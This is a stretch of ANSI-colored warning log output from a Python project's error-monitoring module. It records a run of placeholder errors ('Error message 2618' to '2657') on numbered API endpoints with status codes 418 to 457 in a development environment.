WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.827584Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m53[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2618'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_18[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m418[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.827635Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m53[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2619'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_19[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m419[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.827684Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m53[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2620'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_20[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m420[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.827733Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m53[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2621'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_21[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m421[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.827782Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m53[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2622'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_22[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m422[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.827831Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m53[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2623'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_23[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m423[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.827884Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m53[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2624'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_24[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m424[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.827936Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m53[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2625'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_25[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m425[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.827987Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m53[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2626'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_26[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m426[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.828036Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m53[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2627'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_27[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m427[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.828085Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m53[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2628'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_28[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m428[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.828134Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m53[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2629'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_29[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m429[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.828184Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m53[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2630'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_30[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m430[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.828233Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m53[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2631'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_31[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m431[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.828282Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m53[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2632'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_32[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m432[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.828383Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m53[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2633'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_33[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m433[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.828450Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m53[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2634'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_34[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m434[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.828510Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m53[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2635'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_35[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m435[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.828565Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m53[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2636'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_36[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m436[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.828622Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m53[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2637'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_37[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m437[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.828677Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m53[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2638'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_38[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m438[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.828729Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m53[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2639'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_39[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m439[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.828779Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m53[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2640'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_40[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m440[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.828830Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m53[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2641'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_41[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m441[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.828879Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m53[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2642'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_42[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m442[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.828929Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m53[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2643'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_43[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m443[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.828978Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m53[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2644'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_44[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m444[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.829027Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m53[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2645'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_45[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m445[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.829076Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m53[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2646'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_46[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m446[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.829126Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m53[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2647'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_47[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m447[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.829175Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m53[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2648'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_48[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m448[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.829224Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m53[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2649'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_49[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m449[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.829272Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m54[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2650'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_50[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m450[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.829320Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m54[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2651'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_51[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m451[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.829369Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m54[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2652'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_52[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m452[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.829419Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m54[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2653'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_53[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m453[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.829526Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m54[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2654'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_54[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m454[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.829606Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m54[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2655'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_55[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m455[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.829664Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m54[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2656'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_56[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m456[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.829717Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m54[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2657'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_57[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m457[0m
